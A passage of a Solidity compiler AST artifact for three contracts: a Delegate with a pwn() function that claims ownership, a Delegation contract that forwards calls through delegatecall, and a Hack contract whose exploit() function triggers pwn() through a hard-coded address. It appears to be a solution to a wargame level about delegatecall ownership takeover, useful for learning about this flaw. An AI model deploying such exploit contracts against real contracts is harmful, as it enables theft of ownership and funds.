														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "214:6:0",
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "210:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "202:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 20,
												"nodeType": "ExpressionStatement",
												"src": "202:18:0"
											}
										]
									},
									"functionSelector": "dd365b8b",
									"id": 22,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "pwn",
									"nameLocation": "182:3:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "185:2:0"
									},
									"returnParameters": {
										"id": 15,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "195:0:0"
									},
									"scope": 23,
									"src": "173:53:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 104,
							"src": "60:169:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Delegation",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 66,
							"linearizedBaseContracts": [
								66
							],
							"name": "Delegation",
							"nameLocation": "242:10:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 25,
									"mutability": "mutable",
									"name": "owner",
									"nameLocation": "275:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 66,
									"src": "260:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 24,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "260:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 28,
									"mutability": "mutable",
									"name": "delegate",
									"nameLocation": "294:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 66,
									"src": "285:17:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Delegate_$23",
										"typeString": "contract Delegate"
									},
									"typeName": {
										"id": 27,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 26,
											"name": "Delegate",
											"nameLocations": [
												"285:8:0"
											],
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 23,
											"src": "285:8:0"
										},
										"referencedDeclaration": 23,
										"src": "285:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Delegate_$23",
											"typeString": "contract Delegate"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 44,
										"nodeType": "Block",
										"src": "347:75:0",
										"statements": [
											{
												"expression": {
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 33,
														"name": "delegate",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 28,
														"src": "354:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Delegate_$23",
															"typeString": "contract Delegate"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 35,
																"name": "_delegateAddress",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 30,
																"src": "374:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 34,
															"name": "Delegate",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "365:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_Delegate_$23_$",
																"typeString": "type(contract Delegate)"
															}
														},
														"id": 36,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "365:26:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Delegate_$23",
															"typeString": "contract Delegate"
														}
													},
													"src": "354:37:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Delegate_$23",
														"typeString": "contract Delegate"
													}
												},
												"id": 38,
												"nodeType": "ExpressionStatement",
												"src": "354:37:0"
											},
											{
												"expression": {
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 39,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 25,
														"src": "398:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 40,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "406:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 41,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "410:6:0",
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "406:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "398:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 43,
												"nodeType": "ExpressionStatement",
												"src": "398:18:0"
											}
										]
									},
									"id": 45,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 30,
												"mutability": "mutable",
												"name": "_delegateAddress",
												"nameLocation": "329:16:0",
												"nodeType": "VariableDeclaration",
												"scope": 45,
												"src": "321:24:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 29,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "321:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "320:26:0"
									},
									"returnParameters": {
										"id": 32,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "347:0:0"
									},
									"scope": 66,
									"src": "309:113:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 64,
										"nodeType": "Block",
										"src": "448:109:0",
										"statements": [
											{
												"assignments": [
													49,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 49,
														"mutability": "mutable",
														"name": "result",
														"nameLocation": "461:6:0",
														"nodeType": "VariableDeclaration",
														"scope": 64,
														"src": "456:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 48,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "456:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													},
													null
												],
												"id": 58,
												"initialValue": {
													"arguments": [
														{
															"expression": {
																"id": 55,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "503:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "507:4:0",
															"memberName": "data",
															"nodeType": "MemberAccess",
															"src": "503:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_calldata_ptr",
																"typeString": "bytes calldata"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_calldata_ptr",
																"typeString": "bytes calldata"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 52,
																	"name": "delegate",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 28,
																	"src": "480:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Delegate_$23",
																		"typeString": "contract Delegate"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Delegate_$23",
																		"typeString": "contract Delegate"
																	}
																],
																"id": 51,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "472:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 50,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "472:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 53,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "472:17:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 54,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "490:12:0",
														"memberName": "delegatecall",
														"nodeType": "MemberAccess",
														"src": "472:30:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_baredelegatecall_nonpayable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) returns (bool,bytes memory)"
														}
													},
													"id": 57,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "472:40:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "455:57:0"
											},
											{
												"condition": {
													"id": 59,
													"name": "result",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 49,
													"src": "523:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 63,
												"nodeType": "IfStatement",
												"src": "519:33:0",
												"trueBody": {
													"id": 62,
													"nodeType": "Block",
													"src": "531:21:0",
													"statements": [
														{
															"expression": {
																"id": 60,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967268,
																"src": "540:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Delegation_$66",
																	"typeString": "contract Delegation"
																}
															},
															"id": 61,
															"nodeType": "ExpressionStatement",
															"src": "540:4:0"
														}
													]
												}
											}
										]
									},
									"id": 65,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 46,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "436:2:0"
									},
									"returnParameters": {
										"id": 47,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "448:0:0"
									},
									"scope": 66,
									"src": "428:129:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 104,
							"src": "233:327:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Hack",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 103,
							"linearizedBaseContracts": [
								103
							],
							"name": "Hack",
							"nameLocation": "573:4:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"eventSelector": "13848c3e38f8886f3f5d2ad9dff80d8092c2bbb8efd5b887a99c2c6cfc09ac2a",
									"id": 72,
									"name": "Response",
									"nameLocation": "591:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 71,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 68,
												"indexed": false,
												"mutability": "mutable",
												"name": "success",
												"nameLocation": "605:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 72,
												"src": "600:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 67,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "600:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 70,
												"indexed": false,
												"mutability": "mutable",
												"name": "data",
												"nameLocation": "620:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 72,
												"src": "614:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_memory_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 69,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "614:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "599:26:0"
									},
									"src": "585:41:0"
								},
								{
									"constant": false,
									"id": 78,
									"mutability": "mutable",
									"name": "delegationContract",
									"nameLocation": "808:18:0",
									"nodeType": "VariableDeclaration",
									"scope": 103,
									"src": "797:86:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Delegation_$66",
										"typeString": "contract Delegation"
									},
									"typeName": {
										"id": 74,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 73,
											"name": "Delegation",
											"nameLocations": [
												"797:10:0"
											],
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 66,
											"src": "797:10:0"
										},
										"referencedDeclaration": 66,
										"src": "797:10:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Delegation_$66",
											"typeString": "contract Delegation"
										}
									},
									"value": {
										"arguments": [
											{
												"hexValue": "307866386538314434373230334135393432343545333643343865313531373039463043313966426538",
												"id": 76,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "number",
												"lValueRequested": false,
												"nodeType": "Literal",
												"src": "840:42:0",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"value": "0xf8e81D47203A594245E36C48e151709F0C19fBe8"
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											],
											"id": 75,
											"name": "Delegation",
											"nodeType": "Identifier",
											"overloadedDeclarations": [],
											"referencedDeclaration": 66,
											"src": "829:10:0",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_contract$_Delegation_$66_$",
												"typeString": "type(contract Delegation)"
											}
										},
										"id": 77,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "typeConversion",
										"lValueRequested": false,
										"nameLocations": [],
										"names": [],
										"nodeType": "FunctionCall",
										"src": "829:54:0",
										"tryCall": false,
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Delegation_$66",
											"typeString": "contract Delegation"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 101,
										"nodeType": "Block",
										"src": "918:303:0",
										"statements": [
											{
												"assignments": [
													82,
													84
												],
												"declarations": [
													{
														"constant": false,
														"id": 82,
														"mutability": "mutable",
														"name": "success",
														"nameLocation": "1066:7:0",
														"nodeType": "VariableDeclaration",
														"scope": 101,
														"src": "1061:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 81,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1061:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 84,
														"mutability": "mutable",
														"name": "data",
														"nameLocation": "1088:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 101,
														"src": "1075:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 83,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "1075:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 95,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "70776e2829",
																	"id": 92,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1161:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_dd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab",
																		"typeString": "literal_string \"pwn()\""
																	},
																	"value": "pwn()"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_dd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab",
																		"typeString": "literal_string \"pwn()\""
																	}
																],
																"expression": {
																	"id": 90,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967295,
																	"src": "1137:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 91,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberLocation": "1141:19:0",
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"src": "1137:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 93,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1137:32:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 87,
																	"name": "delegationContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 78,
																	"src": "1104:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Delegation_$66",
																		"typeString": "contract Delegation"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Delegation_$66",
																		"typeString": "contract Delegation"
																	}
																],
																"id": 86,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1096:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 85,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1096:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 88,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1096:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 89,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1124:12:0",
														"memberName": "delegatecall",
														"nodeType": "MemberAccess",
														"src": "1096:40:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_baredelegatecall_nonpayable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) returns (bool,bytes memory)"
														}
													},
													"id": 94,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1096:74:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1060:110:0"
											},
											{
												"eventCall": {
													"arguments": [
														{
															"id": 97,
															"name": "success",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 82,
															"src": "1199:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"id": 98,
															"name": "data",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 84,
															"src": "1208:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 96,
														"name": "Response",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 72,
														"src": "1190:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_bool_$_t_bytes_memory_ptr_$returns$__$",
															"typeString": "function (bool,bytes memory)"
														}
													},
													"id": 99,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1190:23:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 100,
												"nodeType": "EmitStatement",
												"src": "1185:28:0"
											}
										]
									},
									"functionSelector": "63d9b770",
									"id": 102,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "exploit",
									"nameLocation": "901:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 79,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "908:2:0"
									},
									"returnParameters": {
										"id": 80,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "918:0:0"
									},
									"scope": 103,
									"src": "892:329:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 104,
							"src": "564:660:0",
							"usedErrors": []
						}
					],
					"src": "33:1191:0"
				},
				"id": 0
			}
		}
	}
}